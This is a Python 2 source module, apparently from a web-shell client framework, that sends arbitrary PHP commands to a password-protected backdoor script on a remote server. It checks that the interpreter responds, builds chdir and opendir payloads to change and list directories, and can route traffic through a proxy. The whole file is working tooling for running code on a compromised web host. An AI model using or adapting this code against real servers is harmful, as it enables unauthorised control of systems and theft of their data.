'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.http.cmdrequest import CmdRequest, NoDataException
import random, os

classname = 'Php'
    
class Php(Module):
    '''Execute single PHP commands
    :shell.php "<command>;"
    '''
    
    def __init__(self, modhandler, url, password):
        
        self.cwd_vector = None
        self.path = None
        self.proxy = None
        
        Module.__init__(self, modhandler, url, password)
        
        proxy = self.modhandler.conf.get_option('global', 'http_proxy')
        if proxy:
            print '[shell.php] Setting http proxy \'%s\'' % (proxy)
            self.proxy = { 'http' : proxy }
            
            
        if self.run('is_callable("is_dir") && is_callable("chdir") && print(1);', False) != '1':
            print '[!] Error testing directory change methods, \'cd\' and \'ls\' will not work.'
        else:
            self.cwd_vector = "chdir('%s') && %s" 
        

    def _probe(self):
        
        
        rand = str(random.randint( 11111, 99999 ))
        if self.run('echo %s;' % (rand)) != rand:
            raise ModuleException("shell.sh",  "PHP interpreter initialization failed")
        
    
    def run(self, cmd, use_current_path = True):

        if use_current_path and self.path:
            cmd = self.cwd_vector % (self.path, cmd)
        
        request = CmdRequest( self.url, self.password, self.proxy)
        request.setPayload(cmd)
        
        print cmd
        
        try:
            resp = request.execute()
        except NoDataException, e:
            print '[-] No data returned'
        except Exception, e:
            print '[!] Error requesting data: check URL or your internet connection.'
        else:
            return resp
        

    def cwd_handler (self, path):
        
        response = self.run("is_dir('%s') && print(1);" % path, False)
        if response == '1':
            self.path = path
            return True
        return False
    
    def ls_handler (self, cmd):
        
        cmd_splitted = cmd.split()
        
        ls_vector = "$dir=@opendir('%s'); $a=array(); while(($f = readdir($dir))) { $a[]=$f; }; sort($a); print(join('\n', $a));"
        
        if len(cmd_splitted)==2:
            path = cmd_splitted[1]
        else:
            path = self.path
            
            
        return self.run( ls_vector % (path), False)
    
    